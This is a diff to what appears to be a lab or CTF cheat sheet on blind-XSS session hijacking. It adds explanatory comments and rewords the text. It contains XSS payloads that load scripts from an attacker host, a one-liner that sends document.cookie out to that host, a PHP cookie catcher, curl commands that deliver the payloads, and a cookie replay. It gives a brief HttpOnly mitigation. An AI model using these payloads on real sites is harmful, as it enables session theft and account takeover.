@@ -4,12 +4,12 @@
 
 ## Attack Concept
 
-Steal the victim's session cookie via JavaScript → set it in attacker's browser → become the victim. No password ever needed.
+Steal the victim's session cookie via JavaScript, set it in the attacker's browser, and become the victim. No password is ever needed.
 
-Works because:
-- `document.cookie` returns all non-`HttpOnly` cookies for the current origin
-- Cookies alone authenticate most session-based apps
-- Attacker can replay the cookie from anywhere with network access
+This works because:
+- `document.cookie` returns all non-`HttpOnly` cookies for the current origin.
+- Cookies alone authenticate most session-based apps.
+- The attacker can replay the cookie from anywhere with network access.
 
 > Mitigation: set session cookies `HttpOnly` (JS can't read them) + `Secure` (HTTPS only) + `SameSite=Strict`.
 
@@ -17,14 +17,9 @@ Works because:
 
 ## Blind XSS
 
-Triggered on a page the attacker **can't see** — usually an admin panel reviewing user-submitted data:
-- Contact forms
-- User registration / profile fields
-- Support tickets
-- Review submissions
-- HTTP headers (`User-Agent`, `Referer`) reflected in admin logs
+Blind XSS (Cross-Site Scripting) is triggered on a page the attacker cannot see. It usually fires in an admin panel that reviews user-submitted data. Common locations include contact forms, user registration fields, support tickets, review submissions, and HTTP headers like `User-Agent` or `Referer` that are reflected in admin logs.
 
-Detection is indirect: inject a payload that fires an HTTP request back to your server. If you see the callback, the page is vulnerable.
+Detection is indirect. Inject a payload that fires an HTTP request back to your server. If you see the callback, the page is vulnerable.
 
 ---
 
@@ -37,12 +32,13 @@ fullname: <script src=http://ATTACKER/fullname></script>
 username: <script src=http://ATTACKER/username></script>
 imgurl:   <script src=http://ATTACKER/imgurl></script>
 ```
+> Each field gets a unique path. When the admin views the submission, the request that arrives at your server reveals which field is vulnerable. Replace `ATTACKER` with your tun0 IP and port.
 
 When the admin bot views the submission, the script that fires reveals which field is vulnerable by the path in the callback.
 
 **Skip these fields:**
-- `email` — regex-validated front+back end
-- `password` — hashed before storage, never displayed
+- `email` — validated by regex on both front and back end
+- `password` — hashed before storage and never displayed
 
 ---
 
@@ -55,8 +51,9 @@ When the admin bot views the submission, the script that fires reveals which fie
 javascript:eval('var a=document.createElement(\'script\');a.src=\'http://ATTACKER\';document.body.appendChild(a)')
 <script>$.getScript("http://ATTACKER")</script>
 ```
+> Test each breakout prefix (`"`, `'`, or no prefix) with every field. The prefix depends on how the admin panel renders the value — inside a double-quoted attribute, single-quoted attribute, or raw HTML.
 
-Test each with all fields. The breakout prefix (`"`, `'`, or none) depends on how the field is rendered in the admin panel.
+Test each with all fields.
 
 ---
 
@@ -66,8 +63,7 @@ Test each with all fields. The breakout prefix (`"`, `'`, or none) depends on ho
 ```javascript
 new Image().src='http://ATTACKER/index.php?c='+document.cookie
 ```
-
-> `new Image().src` is stealthier than `document.location` — appears as a broken image, no navigation.
+> Sends all accessible cookies to your server as a URL parameter. `new Image().src` causes only a silent HTTP request — no navigation, no visible redirect.
 
 Cookie catcher `index.php`:
 ```php
@@ -83,6 +79,7 @@ if (isset($_GET['c'])) {
 }
 ?>
 ```
+> Receives the cookie string, splits it on semicolons (one cookie per line), URL-decodes each value, then appends them to `cookies.txt` with the victim's IP. Place this file in the same directory as `script.js` before starting your PHP server.
 
 The `explode(";", ...)` splits multiple cookies onto separate lines — handy when the victim has many cookies set.
 
@@ -96,6 +93,7 @@ Or via curl:
 ```bash
 curl -sk "http://TARGET/admin/" -H "Cookie: name=value"
 ```
+> Replays the stolen session cookie in a curl request. Replace `name=value` with the cookie name and value from `cookies.txt`. This authenticates as the victim without a password.
 
 ---
 
@@ -130,6 +128,7 @@ EOF
 
 php -S 0.0.0.0:8080 &
 ```
+> Creates the cookie-catcher PHP page plus the `script.js` exfil payload and starts a background PHP server on port 8080 — swap the attacker IP:port for your tun0 address.
 
 ### Step 2 — Field probe (find vulnerable input)
 
@@ -143,6 +142,7 @@ curl -sk -G "http://10.129.96.115/hijacking/index.php" \
   --data-urlencode "email=test@test.com" \
   --data-urlencode 'imgurl="><script src=http://10.10.17.176:8080/imgurl_dq></script>'
 ```
+> Submits a blind-XSS probe with a unique callback path per field so the listener path that fires identifies the vulnerable input — swap the attacker IP:port and target URL for your environment.
 
 Listener fires `GET /imgurl_dq` → **`imgurl` is the vulnerable field**, breakout is `">`.
 
@@ -156,6 +156,7 @@ curl -sk -G "http://10.129.96.115/hijacking/index.php" \
   --data-urlencode "email=alice@test.com" \
   --data-urlencode 'imgurl="><script src=http://10.10.17.176:8080/script.js></script>'
 ```
+> Submits the cookie-stealing payload in the confirmed vulnerable `imgurl` field so the admin bot loads `script.js` — swap the attacker IP:port and target URL for your environment.
 
 Wait for admin bot. `cookies.txt`:
 ```
